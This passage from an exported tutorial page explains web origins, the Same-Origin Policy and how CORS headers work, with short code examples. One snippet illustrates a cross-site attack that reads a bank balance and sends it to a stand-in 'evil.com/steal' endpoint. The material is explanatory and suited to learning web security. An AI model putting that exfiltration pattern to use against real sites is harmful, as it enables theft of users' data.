id="2b4562ad-76f0-80fa-a433-f5eef12bb8be" class="">An <strong>origin</strong> is defined by three components:</p></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-80bf-ac42-f127d270cb79" class="numbered-list" start="1"><li><strong>Scheme (Protocol)</strong>: <code>http://</code> or <code>https://</code></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-80da-ac43-d7728751b2ec" class="numbered-list" start="2"><li><strong>Host (Domain)</strong>: <code>example.com</code></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-800f-befd-de97923be583" class="numbered-list" start="3"><li><strong>Port</strong>: <code>80</code> (HTTP) or <code>443</code> (HTTPS) - default ports are implicit</li></ol></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80c4-bf43-f309606ea065" class=""><strong>Examples:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80d3-911a-c65660d74399" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://example.com:443  → Origin: https://example.com
+http://example.com:80   → Origin: http://example.com
+https://api.example.com → Origin: https://api.example.com
+http://example.com:8080 → Origin: http://example.com:8080
+</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8011-b9fd-db11116f77e8" class=""><strong>Same Origin Examples:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8087-a48d-df332011de8d" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">✅ https://example.com/page1
+✅ https://example.com/page2
+✅ https://example.com:443/api
+// All same origin (port 443 is default for HTTPS)
+</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8061-badb-f4563da1e78a" class=""><strong>Different Origin Examples:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80d3-a0bf-cd82457a3147" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">❌ http://example.com vs https://example.com
+   (Different protocol)
+
+❌ example.com vs www.example.com
+   (Different host)
+
+❌ https://example.com vs https://example.com:8080
+   (Different port)
+
+❌ https://example.com vs https://api.example.com
+   (Different subdomain)
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-800b-940d-e0d6edf9290c" class=""><strong>Why Do We Need SOP and CORS?</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-800a-bbb7-c399160f0c01" class=""><strong>The Problem:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-808e-bc4b-f22a9c2a48a0" class="bulleted-list"><li style="list-style-type:disc">Modern web applications need to access resources from different origins</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8080-bb2f-ec0e73413591" class="bulleted-list"><li style="list-style-type:disc">APIs are often hosted on different domains</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8036-8b0f-e31b1fe7b457" class="bulleted-list"><li style="list-style-type:disc">Third-party services need to integrate</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80d3-9003-c23d0730de7f" class="bulleted-list"><li style="list-style-type:disc">But we need security to prevent unauthorized access</li></ul></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-807c-ab19-e470578be96f" class=""><strong>The Solution:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80cd-b8f2-ff1cc45e0fc3" class="bulleted-list"><li style="list-style-type:disc"><strong>SOP</strong>: Default security mechanism (restricts)</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80ec-9b80-d06ecc22f16b" class="bulleted-list"><li style="list-style-type:disc"><strong>CORS</strong>: Controlled relaxation (allows specific origins)</li></ul></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-8032-a283-d721b9bd511a"/></div><div style="display:contents" dir="auto"><h2 id="2b4562ad-76f0-806c-a772-e453bcb2c8f7" class=""><strong>Same-Origin Policy (SOP)</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-804b-874a-f3397477131c" class=""><strong>Definition</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8032-8e80-d4f5528d5a12" class="">The Same-Origin Policy is a <strong>browser security mechanism</strong> that restricts how documents or scripts loaded from one origin can interact with resources from another origin.</p></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-800e-a0cb-d7d301cfddaa" class=""><strong>What SOP Restricts</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80bb-9f34-d9ff2a97fe77" class=""><strong>1. JavaScript Access to DOM:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80ee-a2cd-cc629462accf" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Same origin - ALLOWED// https://example.com/page1 accessing https://example.com/page2window.open(&#x27;https://example.com/page2&#x27;);
+// Can access DOM, cookies, localStorage// Different origin - BLOCKED// https://example.com accessing https://evil.comwindow.open(&#x27;https://evil.com&#x27;);
+// Cannot access DOM, cookies, localStorage</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-803a-be3f-fc66a6d5e54c" class=""><strong>2. AJAX/Fetch Requests:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-808b-b028-c15090ca72bb" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Same origin - ALLOWEDfetch(&#x27;https://example.com/api/data&#x27;)
+  .then(response =&gt; response.json())
+  .then(data =&gt; console.log(data));
+// Works fine// Different origin - BLOCKED (unless CORS allows)fetch(&#x27;https://api.example.com/data&#x27;)
+  .then(response =&gt; response.json())
+  .then(data =&gt; console.log(data));
+// CORS error: &quot;No &#x27;Access-Control-Allow-Origin&#x27; header&quot;</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80d3-b20e-c62b420a6541" class=""><strong>3. Cookie Access:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8027-b462-fe929e1aaf3e" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Same origin - Cookies accessibledocument.cookie = &quot;sessionId=abc123&quot;;
+// Can read/write cookies// Different origin - Cookies NOT accessible// Cookies are origin-specific</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80ba-814f-f1f63c22b4d8" class=""><strong>4. LocalStorage/SessionStorage:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8048-a946-f409276deb13" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Same origin - Storage accessiblelocalStorage.setItem(&#x27;key&#x27;, &#x27;value&#x27;);
+// Can read/write storage// Different origin - Storage NOT accessible// Storage is origin-specific</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-803b-8c3b-d1100ae1e1c3" class=""><strong>What SOP Does NOT Restrict</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8050-a3a1-fd06fa1aa084" class=""><strong>1. Embedding Resources:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-803a-98ab-e87348b933bc" class="code code-wrap"><code class="language-HTML" style="white-space:pre-wrap;word-break:break-all">&lt;!-- These work across origins --&gt;&lt;img src=&quot;https://other-domain.com/image.jpg&quot;&gt;
+&lt;script src=&quot;https://cdn.example.com/library.js&quot;&gt;&lt;/script&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.example.com/style.css&quot;&gt;
+&lt;iframe src=&quot;https://other-domain.com/page.html&quot;&gt;&lt;/iframe&gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80cc-a410-d267efd2caf3" class=""><strong>2. Form Submissions:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80fe-ab2b-c1f0f854ef73" class="code code-wrap"><code class="language-HTML" style="white-space:pre-wrap;word-break:break-all">&lt;!-- Form can submit to different origin --&gt;&lt;form action=&quot;https://other-domain.com/submit&quot; method=&quot;POST&quot;&gt;
+  &lt;input name=&quot;data&quot; value=&quot;test&quot;&gt;
+&lt;/form&gt;
+&lt;!-- SOP doesn&#x27;t block this (but CORS might) --&gt;</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80fc-9239-fddf32e6cc7e" class=""><strong>3. Redirects:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80d5-99c1-df9bfb01a375" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Redirects work across originswindow.location = &#x27;https://other-domain.com&#x27;;
+// SOP doesn&#x27;t block this</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8051-8b42-deb8d0893351" class=""><strong>Why SOP Exists</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8030-9389-e40f986dd647" class=""><strong>Security Benefits:</strong></p></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-8034-8d2d-e19df8e863fe" class="numbered-list" start="1"><li><strong>Prevents XSS attacks</strong> from accessing sensitive data</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-8065-bcc4-dd54fb59154c" class="numbered-list" start="2"><li><strong>Prevents cookie theft</strong> from other origins</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-80df-a79b-e717bafd600c" class="numbered-list" start="3"><li><strong>Prevents unauthorized data access</strong></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-801f-aaab-cc611a91c56e" class="numbered-list" start="4"><li><strong>Protects user privacy</strong></li></ol></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80b6-a5b7-d353d1d02db4" class=""><strong>Example Attack Without SOP:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-801a-87d5-f93e33d9ce05" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Attacker&#x27;s website: evil.com// User is logged into bank.com in another tab// Without SOP, attacker could:fetch(&#x27;https://bank.com/api/balance&#x27;)
+  .then(response =&gt; response.json())
+  .then(balance =&gt; {
+// Steal user&#x27;s balance!fetch(&#x27;https://evil.com/steal?balance=&#x27; + balance);
+  });
+</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8077-849e-f9515762e5b1" class=""><strong>With SOP:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80bc-b455-f92867dc6817" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Browser blocks the requestfetch(&#x27;https://bank.com/api/balance&#x27;)
+  .catch(error =&gt; {
+// CORS error - request blocked by browserconsole.error(&#x27;Blocked by SOP&#x27;);
+  });
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8086-b5a7-c3373e1c533d" class=""><strong>SOP Exceptions</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8016-9aaa-e2bb320e9b1d" class=""><strong>1. CORS (Cross-Origin Resource Sharing):</strong></p></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8018-8841-ffadbb4d15e6" class="bulleted-list"><li style="list-style-type:disc">Server can allow specific origins via CORS headers</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-804c-b0eb-fb5a39086411" class="bulleted-list"><li style="list-style-type:disc">Controlled relaxation of SOP</li></ul></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8086-ae95-ffe277bb396d" class=""><strong>2. JSONP (JSON with Padding):</strong></p></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8024-a816-dc748f5179c9" class="bulleted-list"><li style="list-style-type:disc">Older technique using <code>&lt;script&gt;</code> tags</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80af-b6dc-cc13ceb3d37e" class="bulleted-list"><li style="list-style-type:disc">Limited to GET requests</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-807f-ada0-e854e7dcb0ac" class="bulleted-list"><li style="list-style-type:disc">Security risks - not recommended</li></ul></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80c5-ac4c-c369cdf1bec9" class=""><strong>3. PostMessage API:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-801a-9da0-f01f327290ad" class="bulleted-list"><li style="list-style-type:disc">Secure cross-origin communication</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-809d-ab4e-c499d552efbc" class="bulleted-list"><li style="list-style-type:disc">Requires explicit message passing</li></ul></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80d1-83c8-f0c3b3736600" class=""><strong>4. CORS Proxy:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-800b-9364-e29984193e0e" class="bulleted-list"><li style="list-style-type:disc">Server-side proxy to bypass CORS</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8038-8397-da4d5dc258a1" class="bulleted-list"><li style="list-style-type:disc">Not recommended for production</li></ul></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-80a9-97ff-fd6d272ab7f4"/></div><div style="display:contents" dir="auto"><h2 id="2b4562ad-76f0-80fb-bcd6-da287a6c3a1f" class=""><strong>Cross-Origin Resource Sharing (CORS)</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8056-ac7d-dba1b2255639" class=""><strong>Definition</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80a3-a729-e5b40e00dd6b" class="">CORS is a mechanism that allows web servers to specify which origins are permitted to access their resources, thereby relaxing the Same-Origin Policy in a controlled manner.</p></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-80cc-a013-cf0f53872ab2" class=""><strong>How CORS Works</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8010-a2fa-da46b452696b" class=""><strong>Step-by-Step Process:</strong></p></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-802c-9108-e23a04ce3673" class="numbered-list" start="1"><li><strong>Browser sends request with Origin header:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8034-af94-d8f12480f95f" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">GET /api/data HTTP/1.1
+Host: api.example.com
+Origin: https://example.com
+</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-8022-ae11-f1e21c4268d8" class="numbered-list" start="2"><li><strong>Server responds with CORS headers:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80de-9a0e-e9e975de53a9" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://example.com
+Access-Control-Allow-Methods: GET, POST
+Access-Control-Allow-Headers: Content-Type
+Content-Type: application/json
+
+{&quot;data&quot;: &quot;value&quot;}
+</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-8047-a075-e85b41f2fb70" class="numbered-list" start="3"><li><strong>Browser checks CORS headers:</strong><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8065-b702-d76169d8e2ea" class="bulleted-list"><li style="list-style-type:disc">If Origin is allowed → Request proceeds</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-807f-abc8-fdad94aeeabf" class="bulleted-list"><li style="list-style-type:disc">If Origin is not allowed → Request blocked</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8089-803f-c1cb0881ec80" class=""><strong>Important: CORS is Browser-Enforced</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80ad-8f92-de59994943d3" class=""><strong>Key Point:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80df-a5d3-d6143f8952e6" class="bulleted-list"><li style="list-style-type:disc">CORS is enforced by the <strong>browser</strong>, not the server</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8084-9f7e-fa2a1cdea132" class="bulleted-list"><li style="list-style-type:disc">Direct requests (curl, Postman) <strong>bypass CORS</strong></li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8045-8b5e-e7413038c7ab" class="bulleted-list"><li style="list-style-type:disc">CORS only affects browser-based requests</li></ul></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80d8-978b-f23ca3563e21" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8074-900f-e9994f5401a4" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all"># Browser request (subject to CORS)# JavaScript in browser:
+fetch(&#x27;https://api.example.com/data&#x27;)
+# Browser checks CORS headers# Direct request (bypasses CORS)
+curl https://api.example.com/data
+# No CORS check - request goes through</code></pre></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-809f-8ca7-ef9cb75c3a7d"/></div><div style="display:contents" dir="auto"><h2 id="2b4562ad-76f0-8083-9657-d9e68d906cbc" class=""><strong>CORS Headers Explained</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8039-a378-de26df5a19ad" class=""><strong>Request Headers (Sent by Browser)</strong></h3></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8063-b30e-e82a99bbcdec" class=""><strong>Origin</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80e5-9745-e1d551414cf1" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Origin: https://example.com
+</code></pre></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-808a-8e86-ff35700f7011" class="bulleted-list"><li style="list-style-type:disc">Automatically set by browser</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8038-aa9c-f0af09f02cbb" class="bulleted-list"><li style="list-style-type:disc">Cannot be modified by JavaScript</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80dc-ae90-d9509020568e" class="bulleted-list"><li style="list-style-type:disc">Indicates the origin of the requesting page</li></ul></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-80f8-a3dd-dfb4975e45d3" class=""><strong>Access-Control-Request-Method</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" 